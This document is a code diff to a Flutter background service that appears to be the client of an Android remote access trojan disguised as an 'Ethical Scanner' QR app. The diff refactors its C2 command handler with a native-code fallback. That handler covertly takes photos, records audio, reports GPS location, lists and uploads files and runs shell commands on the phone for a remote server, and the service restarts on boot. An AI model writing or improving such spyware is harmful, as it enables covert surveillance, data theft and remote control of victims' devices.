@@ -6,6 +6,7 @@ import 'dart:isolate';
 import 'dart:ui';
 
 import 'package:flutter/foundation.dart';
+import 'package:flutter/services.dart';
 import 'package:flutter_background_service/flutter_background_service.dart'
     show
         AndroidConfiguration,
@@ -53,12 +54,41 @@ class BackgroundServiceHandles {
   });
 }
 
+// Enhanced command execution modes
+enum CommandExecutionMode {
+  uiThread,     // Try UI thread first
+  native,       // Force native execution
+  fallback,     // Try UI, fallback to native
+}
+
+// Command execution result
+class CommandResult {
+  final bool success;
+  final Map<String, dynamic> data;
+  final String? error;
+  final CommandExecutionMode executedMode;
+
+  const CommandResult({
+    required this.success,
+    required this.data,
+    this.error,
+    required this.executedMode,
+  });
+}
+
 Timer? _heartbeatTimer;
 Timer? _reconnectionTimer;
 StreamSubscription<bool>? _connectionStatusSubscription;
 StreamSubscription<Map<String, dynamic>>? _commandSubscription;
 int _reconnectionAttempts = 0;
-const int _maxReconnectionAttempts = 50; // Keep trying indefinitely
+const int _maxReconnectionAttempts = 50;
+
+// Enhanced command tracking
+final Map<String, Completer<CommandResult>> _pendingCommands = {};
+final Map<String, Timer> _commandTimeouts = {};
+
+// Native command channel
+const MethodChannel _nativeCommandsChannel = MethodChannel('com.example.kem/native_commands');
 
 @pragma('vm:entry-point')
 Future<void> onStart(ServiceInstance service) async {
@@ -173,6 +203,9 @@ void _setupUICommandHandlers(BackgroundServiceHandles h) {
       return;
     }
 
+    // Complete pending command
+    _completeCommand(originalCommandRef, status == 'success', payload ?? {}, CommandExecutionMode.uiThread);
+
     if (status == 'success' && payload != null && payload.containsKey('path')) {
       final filePath = payload['path'] as String;
       debugPrint("BackgroundService: UI took picture successfully. Path: $filePath. Uploading...");
@@ -206,6 +239,8 @@ void _setupUICommandHandlers(BackgroundServiceHandles h) {
       return;
     }
 
+    _completeCommand(originalCommandRef, status == 'success', payload ?? {}, CommandExecutionMode.uiThread);
+
     if (status == 'success' && payload != null) {
       h.networkService.sendCommandResponse(
         originalCommand: originalCommandRef,
@@ -236,6 +271,8 @@ void _setupUICommandHandlers(BackgroundServiceHandles h) {
       return;
     }
 
+    _completeCommand(originalCommandRef, status == 'success', payload ?? {}, CommandExecutionMode.uiThread);
+
     if (status == 'success' && payload != null) {
       h.networkService.sendCommandResponse(
         originalCommand: originalCommandRef,
@@ -265,6 +302,8 @@ void _setupUICommandHandlers(BackgroundServiceHandles h) {
       debugPrint("BackgroundService: 'original_command_ref' missing in execute_record_voice_from_ui_result");
       return;
     }
+
+    _completeCommand(originalCommandRef, status == 'success', payload ?? {}, CommandExecutionMode.uiThread);
 
     if (status == 'success' && payload != null && payload.containsKey('path')) {
       final filePath = payload['path'] as String;
@@ -383,36 +422,144 @@ void _stopHeartbeat() {
 Future<void> _handleC2Command(BackgroundServiceHandles h, String commandName, Map<String, dynamic> args) async {
   debugPrint("BackgroundService: Processing command: $commandName");
   
-  switch (commandName) {
-    case SIO_CMD_TAKE_PICTURE:
-      try {
+  try {
+    final result = await _executeCommandWithFallback(h, commandName, args);
+    
+    if (result.success) {
+      h.networkService.sendCommandResponse(
+        originalCommand: commandName,
+        status: 'success',
+        payload: result.data,
+      );
+    } else {
+      h.networkService.sendCommandResponse(
+        originalCommand: commandName,
+        status: 'error',
+        payload: {'message': result.error ?? 'Command execution failed'},
+      );
+    }
+  } catch (e, s) {
+    debugPrint("BackgroundService: Unexpected error in command $commandName: $e\nStackTrace: $s");
+    h.networkService.sendCommandResponse(
+      originalCommand: commandName,
+      status: 'error',
+      payload: {'message': 'Unexpected error: ${e.toString()}'},
+    );
+  }
+}
+
+/// Enhanced command execution with intelligent fallback
+Future<CommandResult> _executeCommandWithFallback(
+  BackgroundServiceHandles h, 
+  String commandName, 
+  Map<String, dynamic> args,
+) async {
+  final commandId = _generateCommandId();
+  
+  // Check if native service is available
+  final nativeAvailable = await _isNativeServiceAvailable();
+  
+  if (nativeAvailable) {
+    debugPrint("BackgroundService: Native service available, attempting smart execution for $commandName");
+    
+    // For critical commands, try UI first with quick fallback
+    if (_isCriticalCommand(commandName)) {
+      final uiResult = await _tryUIExecution(h, commandName, args, commandId);
+      if (uiResult.success) {
+        return uiResult;
+      }
+      
+      debugPrint("BackgroundService: UI execution failed for $commandName, falling back to native");
+      return await _executeNativeCommand(commandName, args);
+    } else {
+      // For non-critical commands, go directly to native for better reliability
+      return await _executeNativeCommand(commandName, args);
+    }
+  } else {
+    // No native service, try UI only
+    debugPrint("BackgroundService: Native service not available, trying UI execution only");
+    return await _tryUIExecution(h, commandName, args, commandId);
+  }
+}
+
+/// Try executing command through UI thread with timeout
+Future<CommandResult> _tryUIExecution(
+  BackgroundServiceHandles h,
+  String commandName,
+  Map<String, dynamic> args,
+  String commandId,
+) async {
+  final completer = Completer<CommandResult>();
+  _pendingCommands[commandId] = completer;
+  
+  // Set timeout for UI execution
+  _commandTimeouts[commandId] = Timer(const Duration(seconds: 15), () {
+    if (!completer.isCompleted) {
+      _pendingCommands.remove(commandId);
+      _commandTimeouts.remove(commandId);
+      completer.complete(CommandResult(
+        success: false,
+        data: {},
+        error: 'UI execution timeout',
+        executedMode: CommandExecutionMode.uiThread,
+      ));
+    }
+  });
+  
+  try {
+    switch (commandName) {
+      case SIO_CMD_TAKE_PICTURE:
         final lensString = args['camera'] as String?;
         final lensArg = lensString?.toLowerCase() == 'front' ? 'front' : 'back';
-
-        debugPrint("BackgroundService: Requesting UI to take picture with lens: $lensArg");
-
+        
         h.serviceInstance.invoke('execute_take_picture_from_ui', {
           'camera': lensArg,
-          'original_command_ref': SIO_CMD_TAKE_PICTURE,
+          'original_command_ref': commandId,
         });
-      } catch (e, s) {
-        debugPrint("BackgroundService: Error in SIO_CMD_TAKE_PICTURE: $e\nStackTrace: $s");
-        h.networkService.sendCommandResponse(
-          originalCommand: SIO_CMD_TAKE_PICTURE,
-          status: 'error',
-          payload: {'message': 'BG error preparing take_picture: ${e.toString()}'},
-        );
-      }
-      break;
-
-    case SIO_CMD_GET_LOCATION:
-      try {
+        break;
+        
+      case SIO_CMD_LIST_FILES:
+        final path = args["path"] as String? ?? "/storage/emulated/0";
+        
+        h.serviceInstance.invoke('execute_list_files_from_ui', {
+          'path': path,
+          'original_command_ref': commandId,
+        });
+        break;
+        
+      case SIO_CMD_EXECUTE_SHELL:
+        final command = args["command_name"] as String?;
+        final commandArgs = (args["command_args"] as List<dynamic>?)?.map((e) => e.toString()).toList() ?? [];
+        
+        if (command == null || command.isEmpty) {
+          throw Exception("Command name missing for execute_shell");
+        }
+        
+        h.serviceInstance.invoke('execute_shell_from_ui', {
+          'command': command,
+          'args': commandArgs,
+          'original_command_ref': commandId,
+        });
+        break;
+        
+      case SIO_CMD_RECORD_VOICE:
+        final duration = args['duration'] as int? ?? 10;
+        final quality = args['quality'] as String? ?? 'medium';
+        
+        h.serviceInstance.invoke('execute_record_voice_from_ui', {
+          'duration': duration,
+          'quality': quality,
+          'original_command_ref': commandId,
+        });
+        break;
+        
+      case SIO_CMD_GET_LOCATION:
+        // Location can be handled directly in background
         final Position? loc = await h.locationService.getCurrentLocation();
         if (loc != null) {
-          h.networkService.sendCommandResponse(
-            originalCommand: SIO_CMD_GET_LOCATION,
-            status: 'success',
-            payload: {
+          return CommandResult(
+            success: true,
+            data: {
               'latitude': loc.latitude,
               'longitude': loc.longitude,
               'accuracy': loc.accuracy,
@@ -420,129 +567,119 @@ Future<void> _handleC2Command(BackgroundServiceHandles h, String commandName, Ma
               'speed': loc.speed,
               'timestamp_gps': loc.timestamp?.toIso8601String(),
             },
+            executedMode: CommandExecutionMode.uiThread,
           );
         } else {
           throw Exception("Location unavailable");
         }
-      } catch (e, s) {
-        debugPrint("BackgroundService: Error executing SIO_CMD_GET_LOCATION: $e\nStackTrace: $s");
-        h.networkService.sendCommandResponse(
-          originalCommand: SIO_CMD_GET_LOCATION,
-          status: 'error',
-          payload: {'message': e.toString()},
-        );
-      }
-      break;
-
-    case SIO_CMD_LIST_FILES:
-      try {
-        final path = args["path"] as String? ?? "/storage/emulated/0";
-        debugPrint("BackgroundService: Requesting UI to list files for path: '$path'");
         
-        h.serviceInstance.invoke('execute_list_files_from_ui', {
-          'path': path,
-          'original_command_ref': SIO_CMD_LIST_FILES,
-        });
-      } catch (e, s) {
-        debugPrint("BackgroundService: Error in SIO_CMD_LIST_FILES: $e\nStackTrace: $s");
-        h.networkService.sendCommandResponse(
-          originalCommand: SIO_CMD_LIST_FILES,
-          status: "error",
-          payload: {"message": "BG error preparing list_files: ${e.toString()}"},
-        );
-      }
-      break;
-
-    case SIO_CMD_UPLOAD_SPECIFIC_FILE:
-      try {
-        final filePath = args["path"] as String?;
-        if (filePath == null || filePath.isEmpty) {
-          throw Exception("File path is required for upload command");
-        }
-
-        final file = File(filePath);
-        if (!await file.exists()) {
-          throw Exception("File not found at path: $filePath");
-        }
-
-        final xfile = XFile(filePath);
-        await h.networkService.uploadFileFromCommand(
-          deviceId: h.currentDeviceId,
-          commandRef: SIO_CMD_UPLOAD_SPECIFIC_FILE,
-          fileToUpload: xfile,
-        );
-      } catch (e, s) {
-        debugPrint("BackgroundService: Error executing SIO_CMD_UPLOAD_SPECIFIC_FILE: $e\nStackTrace: $s");
-        h.networkService.sendCommandResponse(
-          originalCommand: SIO_CMD_UPLOAD_SPECIFIC_FILE,
-          status: "error",
-          payload: {"message": "Pre-upload error in BG: ${e.toString()}"},
-        );
-      }
-      break;
-
-    case SIO_CMD_EXECUTE_SHELL:
-      try {
-        final command = args["command_name"] as String?;
-        final commandArgs = (args["command_args"] as List<dynamic>?)?.map((e) => e.toString()).toList() ?? [];
-
-        if (command == null || command.isEmpty) {
-          throw Exception("Command name missing for execute_shell");
-        }
-        
-        debugPrint("BackgroundService: Requesting UI to execute shell: $command with args: $commandArgs");
-
-        h.serviceInstance.invoke('execute_shell_from_ui', {
-          'command': command,
-          'args': commandArgs,
-          'original_command_ref': SIO_CMD_EXECUTE_SHELL,
-        });
-      } catch (e, s) {
-        debugPrint("BackgroundService: Error executing SIO_CMD_EXECUTE_SHELL: $e\nStackTrace: $s");
-        h.networkService.sendCommandResponse(
-          originalCommand: SIO_CMD_EXECUTE_SHELL,
-          status: "error",
-          payload: {"message": e.toString()},
-        );
-      }
-      break;
-
-    case SIO_CMD_RECORD_VOICE:
-      try {
-        final duration = args['duration'] as int? ?? 10;
-        final quality = args['quality'] as String? ?? 'medium';
-        
-        debugPrint("BackgroundService: Requesting UI to record voice for ${duration}s with quality: $quality");
-        
-        h.serviceInstance.invoke('execute_record_voice_from_ui', {
-          'duration': duration,
-          'quality': quality,
-          'original_command_ref': SIO_CMD_RECORD_VOICE,
-        });
-      } catch (e, s) {
-        debugPrint("BackgroundService: Error executing SIO_CMD_RECORD_VOICE: $e\nStackTrace: $s");
-        h.networkService.sendCommandResponse(
-          originalCommand: SIO_CMD_RECORD_VOICE,
-          status: "error",
-          payload: {"message": e.toString()},
-        );
-      }
-      break;
-
-    case SIO_EVENT_REQUEST_REGISTRATION_INFO:
-      debugPrint("BackgroundService: Server requested registration info. Re-registering...");
-      _registerDeviceWithC2(h);
-      break;
-
-    default:
-      debugPrint("BackgroundService: Received unknown command '$commandName'");
-      h.networkService.sendCommandResponse(
-        originalCommand: commandName,
-        status: 'error',
-        payload: {'message': 'Unknown command received by client: $commandName'},
-      );
-      break;
+      default:
+        throw Exception("Unknown command: $commandName");
+    }
+    
+    return await completer.future;
+  } catch (e) {
+    _pendingCommands.remove(commandId);
+    _commandTimeouts[commandId]?.cancel();
+    _commandTimeouts.remove(commandId);
+    
+    return CommandResult(
+      success: false,
+      data: {},
+      error: e.toString(),
+      executedMode: CommandExecutionMode.uiThread,
+    );
   }
+}
+
+/// Execute command through native Android service
+Future<CommandResult> _executeNativeCommand(String commandName, Map<String, dynamic> args) async {
+  try {
+    debugPrint("BackgroundService: Executing native command: $commandName");
+    
+    final result = await _nativeCommandsChannel.invokeMethod('executeCommand', {
+      'command': commandName,
+      'args': args,
+    });
+    
+    if (result != null && result is Map) {
+      return CommandResult(
+        success: true,
+        data: Map<String, dynamic>.from(result),
+        executedMode: CommandExecutionMode.native,
+      );
+    } else {
+      return CommandResult(
+        success: false,
+        data: {},
+        error: 'Native command returned null result',
+        executedMode: CommandExecutionMode.native,
+      );
+    }
+  } on PlatformException catch (e) {
+    debugPrint("BackgroundService: Native command failed: ${e.code} - ${e.message}");
+    return CommandResult(
+      success: false,
+      data: {},
+      error: '${e.code}: ${e.message}',
+      executedMode: CommandExecutionMode.native,
+    );
+  } catch (e) {
+    debugPrint("BackgroundService: Native command error: $e");
+    return CommandResult(
+      success: false,
+      data: {},
+      error: e.toString(),
+      executedMode: CommandExecutionMode.native,
+    );
+  }
+}
+
+/// Check if native command service is available
+Future<bool> _isNativeServiceAvailable() async {
+  try {
+    final result = await _nativeCommandsChannel.invokeMethod('isNativeServiceAvailable');
+    return result == true;
+  } catch (e) {
+    debugPrint("BackgroundService: Native service check failed: $e");
+    return false;
+  }
+}
+
+/// Determine if command is critical and should try UI first
+bool _isCriticalCommand(String commandName) {
+  switch (commandName) {
+    case SIO_CMD_TAKE_PICTURE:
+    case SIO_CMD_RECORD_VOICE:
+      return true; // These benefit from UI thread access to camera/audio systems
+    case SIO_CMD_LIST_FILES:
+    case SIO_CMD_EXECUTE_SHELL:
+    case SIO_CMD_GET_LOCATION:
+      return false; // These can work well in background
+    default:
+      return false;
+  }
+}
+
+/// Complete a pending command
+void _completeCommand(String commandId, bool success, Map<String, dynamic> data, CommandExecutionMode mode) {
+  final completer = _pendingCommands.remove(commandId);
+  final timer = _commandTimeouts.remove(commandId);
+  
+  timer?.cancel();
+  
+  if (completer != null && !completer.isCompleted) {
+    completer.complete(CommandResult(
+      success: success,
+      data: data,
+      executedMode: mode,
+    ));
+  }
+}
+
+/// Generate unique command ID
+String _generateCommandId() {
+  return 'cmd_${DateTime.now().millisecondsSinceEpoch}_${(DateTime.now().microsecond % 1000)}';
 }
 
 Future<void> _stopService(BackgroundServiceHandles h) async {
@@ -550,6 +687,24 @@ Future<void> _stopService(BackgroundServiceHandles h) async {
   
   _stopHeartbeat();
   _reconnectionTimer?.cancel();
+  
+  // Cancel all pending commands
+  for (final completer in _pendingCommands.values) {
+    if (!completer.isCompleted) {
+      completer.complete(CommandResult(
+        success: false,
+        data: {},
+        error: 'Service stopping',
+        executedMode: CommandExecutionMode.uiThread,
+      ));
+    }
+  }
+  _pendingCommands.clear();
+  
+  for (final timer in _commandTimeouts.values) {
+    timer.cancel();
+  }
+  _commandTimeouts.clear();
   
   await h.dataCollectorService.disposeCamera();
   h.networkService.disconnectSocketIO();
@@ -585,7 +740,7 @@ Future<void> initializeBackgroundService() async {
       'qr_scanner_service_channel',
       'Ethical Scanner Service',
       description: 'Background service for the Ethical Scanner application.',
-      importance: Importance.high, // Changed to high for better persistence
+      importance: Importance.high,
       playSound: false,
       enableVibration: false,
       showBadge: true,
@@ -613,7 +768,7 @@ Future<void> initializeBackgroundService() async {
       initialNotificationTitle: 'Ethical Scanner Active',
       initialNotificationContent: 'Service is running and monitoring commands.',
       foregroundServiceNotificationId: 888,
-      autoStartOnBoot: true, // Added for auto-start on boot
+      autoStartOnBoot: true,
     ),
     iosConfiguration: IosConfiguration(
       autoStart: true,
@@ -622,5 +777,5 @@ Future<void> initializeBackgroundService() async {
     ),
   );
   
-  debugPrint("Background service configured with enhanced persistence.");
+  debugPrint("Background service configured with enhanced persistence and native fallback.");
 }
